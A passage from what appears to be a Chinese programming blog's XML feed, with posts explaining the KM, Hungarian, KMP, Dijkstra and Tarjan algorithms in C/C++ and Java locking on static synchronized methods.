class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            slack[house] = <span class="built_in">min</span>(slack[house], gap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KM</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(match, <span class="number">-1</span>, <span class="keyword">sizeof</span> match);</span><br><span class="line">    <span class="built_in">memset</span>(ex_house, <span class="number">0</span>, <span class="keyword">sizeof</span> ex_house);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        ex_user[i] = love[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; N; ++j) &#123;</span><br><span class="line">            ex_user[i] = <span class="built_in">max</span>(ex_user[i], love[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        <span class="built_in">fill</span>(slack, slack + N, INF);</span><br><span class="line">       <span class="comment">//如果为用户 i 匹配房子失败 则通过降低期望值进行尝试匹配</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">memset</span>(vis_user, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_user);</span><br><span class="line">            <span class="built_in">memset</span>(vis_house, <span class="literal">false</span>, <span class="keyword">sizeof</span> vis_house);</span><br><span class="line">            <span class="comment">// 如果为用户 i 匹配房子成功</span></span><br><span class="line">            <span class="keyword">if</span> (dfs(i)) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">int</span> d = INF;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j)</span><br><span class="line">                <span class="keyword">if</span> (!vis_house[j]) d = <span class="built_in">min</span>(d, slack[j]);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vis_user[j]) ex_user[j] -= d;</span><br><span class="line">                <span class="keyword">if</span> (vis_house[j])</span><br><span class="line">                    ex_house[j] += d;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    slack[j] -= d;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i) res += love[match[i]][i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; ++j) <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;love[i][j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, KM());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>匈牙利算法</tag>
        <tag>KM</tag>
      </tags>
  </entry>
  <entry>
    <title>匈牙利算法求解二分图的最大匹配</title>
    <url>/2020/11/27/%E5%8C%88%E7%89%99%E5%88%A9%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E4%BA%8C%E5%88%86%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://baike.baidu.com/item/%E4%BA%8C%E5%88%86%E5%9B%BE" target="_blank" rel="noopener">二分图</a>：</p>
<p>设<code>G=(V,E)</code>是一个无向图，如果顶点<code>V</code>可分割为两个互不相交的子集<code>(A,B)</code>，并且图中的每条边<code>（i，j）</code>所关联的两个顶点<code>i</code>和<code>j</code>分别属于这两个不同的顶点集<code>(i in A,j in B)</code>，则称图<code>G</code>为一个二分图。</p>
<p>匹配：</p>
<p>给定一个二分图<code>G</code>，在<code>G</code>的一个子图M中，<code>M</code>的边集<code>{E}</code>中的任意两条边都不交汇于同一个结点，则称<code>M</code>是一个匹配。<a id="more"></a></p>
<p>最大匹配：</p>
<p>给定二分图<code>G</code>的所有子图中，满足匹配条件的最大边数子图</p>
<p>关于更多的算法解析，请移步至<a href="https://www.cnblogs.com/cruelty_angel/p/10808729.html" target="_blank" rel="noopener">这位作者的博客</a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="http://acm.hdu.edu.cn/showproblem.php?pid=2063" target="_blank" rel="noopener">HDU2063过山车</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_NUM 501</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">bool</span> graph[MAX_NUM][MAX_NUM];</span><br><span class="line"><span class="keyword">bool</span> visited[MAX_NUM];</span><br><span class="line"><span class="comment">// 存放每个男生匹配的女生</span></span><br><span class="line"><span class="keyword">int</span> matched[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> girlNum, boyNum;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">matching</span><span class="params">(<span class="keyword">int</span> girl)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> boy = <span class="number">1</span>; boy &lt;= boyNum; boy++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (graph[girl][boy] &amp;&amp; !visited[boy]) &#123;</span><br><span class="line">            visited[boy] = <span class="literal">true</span>;</span><br><span class="line">          	<span class="comment">// 假若该男生未被匹配 或者 该男生匹配的女生 能够可以更换其他男生</span></span><br><span class="line">            <span class="keyword">if</span> (matched[boy] == <span class="number">0</span> || matching(matched[boy]) == <span class="number">1</span>) &#123;</span><br><span class="line">                matched[boy] = girl;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Hungary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> girl = <span class="number">1</span>; girl &lt;= girlNum; girl++) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visited, <span class="literal">false</span>, <span class="keyword">sizeof</span>(visited));</span><br><span class="line">        sum += matching(girl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k, girl, boy;</span><br><span class="line">    <span class="keyword">while</span> (~(<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;k)) &amp;&amp; k) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girlNum, &amp;boyNum);</span><br><span class="line">        <span class="built_in">memset</span>(graph, <span class="literal">false</span>, <span class="keyword">sizeof</span>(graph));</span><br><span class="line">        <span class="built_in">memset</span>(matched, <span class="number">0</span>, <span class="keyword">sizeof</span>(matched));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;girl, &amp;boy);</span><br><span class="line">            graph[girl][boy] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Hungary());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>DFS</tag>
        <tag>匈牙利算法</tag>
      </tags>
  </entry>
  <entry>
    <title>串的模式匹配算法之KMP算法</title>
    <url>/2020/11/27/%E4%B8%B2%E7%9A%84%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E4%B9%8BKMP%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<p>子串的定位操作通常称做串的<strong>模式匹配</strong>，是各种串处理系统中最重要的操作之一。</p>
<p>模式串<code>T</code>: 子串</p>
<p>主串<code>S</code>：源串</p>
<h2 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h2><p>最容易想到的就是利用回溯的思想进行暴力求解：<a id="more"></a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// O(n*m)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">while</span> (i &lt; SLength &amp;&amp; j &lt; TLength) &#123;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            i++, j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 回溯指针</span></span><br><span class="line">            i = i - j + <span class="number">1</span>;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j &gt;= TLength) <span class="keyword">return</span> i - TLength;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面不足之处在于每次遇到不匹配的时候，指针总是回溯到上次的起点的下一个位置，例如下面的情况(<code>S=ababcabcacbab</code>   <code>T=abcac</code>)，<code>i=6, j =4</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:    a b c a c</span><br></pre></td></tr></table></figure>

<p>按照暴力法，下次<code>i=i - j + 1=3, j =0</code>，但是我们经过思考，发现模式串的下标为<code>0</code>的元素是和下标为<code>3</code>的元素是相同的，那我们往后尝试匹配的过程中，只要未成功，就一定会出现下面的情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">S:a b a b c a b c a c b a b</span><br><span class="line">T:          a b c a c</span><br></pre></td></tr></table></figure>

<p>那我们完全可以不同时回溯指针<code>i</code>和<code>j</code>，直接将模式串往后移动<code>3</code>个单位进行匹配</p>
<p>利用这种“部分匹配”的特性，我们可以在遇到不匹配的时候，不将指针<code>i</code>回溯，而是尽量将模式串往右“滑动”特定单位长度进行继续匹配。</p>
<p>关键是移动的长度该如何求解？</p>
<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>该算法由<code>D.E.Knuth</code>和<code>V.R.Pratt</code>和<code>J.H.Morris</code>同时发现的，人们称之为克努特-莫斯里-普拉特操作，简称<code>KMP</code>算法。该算法能将时间复杂度降到<code>O(n+m)</code></p>
<p>该算法关键在于求解<code>next[]</code>，若令<code>next[i]=j</code>，则表示模式串中第<code>i</code>个字符与主串中相对应字符不匹配的时候，在模式串中需要重新和主串中该字符进行比较的字符的位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getNext</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> *next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>, length = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        j = next[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; str[j] != str[i]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == str[j]) &#123;</span><br><span class="line">            next[i] = j + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            next[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">KMP</span><span class="params">(<span class="keyword">char</span> *S, <span class="keyword">char</span> *T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> next[MAXLEN];</span><br><span class="line">    getNext(T, next);</span><br><span class="line">    <span class="keyword">int</span> SLength = <span class="built_in">strlen</span>(S), TLength = <span class="built_in">strlen</span>(T);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; SLength; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; S[i] != T[j]) &#123;</span><br><span class="line">            j = next[j - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (S[i] == T[j]) &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j == TLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>字符串</tag>
        <tag>KMP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中给静态方法添加synchronized时候的锁</title>
    <url>/2020/10/29/Java%E4%B8%AD%E7%BB%99%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E6%B7%BB%E5%8A%A0synchronized%E6%97%B6%E5%80%99%E7%9A%84%E9%94%81/</url>
    <content><![CDATA[<p>在<code>java</code>静态方法上面加<code>synchronized</code>的时候，是把当前类的<code>Class</code>类对象进行持锁。例如下面的例子：</p>
<p><code>Service.java</code>：分别提供两个静态方法和一个非静态方法<a id="more"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printA()"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printA()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printB()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printB()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 进入 printC()"</span>);</span><br><span class="line">        System.out.println(<span class="string">"thread name = "</span> + Thread.currentThread().getName() + <span class="string">" 在 "</span> +</span><br><span class="line">                System.currentTimeMillis() + <span class="string">" 退出 printC()"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程A调用静态方法A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadA</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadA</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printA();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>线程B调用静态方法B</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadB</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadB</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printB();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进程C调用非静态方法C</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yalexin.thread.demo03;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author：Yalexin</span></span><br><span class="line"><span class="comment"> * Email： 181303209@yzu.edu.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadC</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadC</span><span class="params">(Service service)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Service service;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        service.printC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">thread name = AAAA 在 <span class="number">1603940400153</span> 进入 printA()</span><br><span class="line">thread name = CCCC 在 <span class="number">1603940400153</span> 进入 printC()</span><br><span class="line">thread name = CCCC 在 <span class="number">1603940400153</span> 退出 printC()</span><br><span class="line">thread name = AAAA 在 <span class="number">1603940402169</span> 退出 printA()</span><br><span class="line">thread name = BBBB 在 <span class="number">1603940402169</span> 进入 printB()</span><br><span class="line">thread name = BBBB 在 <span class="number">1603940402169</span> 退出 printB()</span><br></pre></td></tr></table></figure>

<p>可以看到</p>
<p>A方法和B方法是同步的，是因为<code>synchronized</code>关键字加到静态方法上面的时候，是将<code>Service</code>类的<code>Class</code>类对象作为锁，而C方法和A或者B方法是异步的，是因为<code>synchronized</code>关键字加到非静态方法上面的时候，是将<code>Service</code>类的实例化对象作为锁，即C方法的锁和A或B的锁是两个不同的锁，二者可以异步进行。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法求最短路</title>
    <url>/2020/10/19/Dijkstra%E7%AE%97%E6%B3%95%E6%B1%82%E6%9C%80%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p><code>Dijkstra</code>算法和<code>Prim</code>算法具有极其相似的地方，二者都是构建两个集合，利用贪心算法，将其中一个集合不断进行扩充，最终求得最优解。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7ffffff</span></span><br><span class="line"><span class="keyword">int</span> adj[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> minD[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">bool</span> visited[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> t, n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, minDistance;</span><br><span class="line">    minD[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    visited[<span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) minD[i] = adj[i][<span class="number">1</span>] != <span class="number">0</span> ? adj[i][<span class="number">1</span>] : INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        u = <span class="number">-1</span>, minDistance = INF;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; minDistance &gt; minD[j]) &#123;</span><br><span class="line">                u = j;</span><br><span class="line">                minDistance = minD[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="comment">// 如果 j 没有被访问过且 j 和 u 之间联通 并且 j 通过 u 可以缩短 j 到已被访问的点集之间的距离</span></span><br><span class="line">            <span class="keyword">if</span> (!visited[j] &amp;&amp; adj[j][u] != <span class="number">0</span> &amp;&amp;</span><br><span class="line">                minD[j] &gt; minDistance + adj[j][u]) &#123;</span><br><span class="line">                minD[j] = minDistance + adj[j][u];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, minD[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
        <tag>C</tag>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Tarjan算法求割点隔边</title>
    <url>/2020/10/19/Tarjan%E7%AE%97%E6%B3%95%E6%B1%82%E5%89%B2%E7%82%B9%E9%9A%94%E8%BE%B9/</url>
    <content><![CDATA[<h2 id="Tarjan"><a href="#Tarjan" class="headerlink" title="Tarjan"></a>Tarjan</h2><p>美国著名科学家，全名 <code>Robert Tarjan</code>，在图论和数据结构方面有着重要突出贡献。本文所介绍的算法是求解有向图强连通分量的算法，它能做到线性时间的复杂度。算法维护两个数组<a id="more"></a></p>
<ul>
<li><code>fdn[]</code>：在<code>DFS</code>中，每个节点被访问的次序，即时间戳。</li>
<li><code>low[]</code>：在<code>DFS</code>中，每个节点不通过与父亲节点直接相连的边而访问的最早时间戳。</li>
</ul>
<p>利用这两个数组可以求解许多问题，例如求割点、割边、强连通分量个数等。</p>
<p>当一个点是割点，满足下面的条件时成立：</p>
<ul>
<li>如果节点<code>u</code>是总的<code>DFS</code>树的根，该节点<code>u</code>有多于1个的子树。</li>
<li>如果节点<code>u</code>不是总的<code>DFS</code>树的根，该节点<code>u</code>存在一颗子树，子树的根节点为<code>v</code>，且<code>dfn[u]&lt;=low[v]</code></li>
</ul>
<p>而一条边<code>(u,v)</code>是割边，当且仅当这两点之间没有重边，而且<code>dfn[u] &lt; low[v]</code></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 20001</span></span><br><span class="line"><span class="comment">// 割边集合</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; edgeCut;</span><br><span 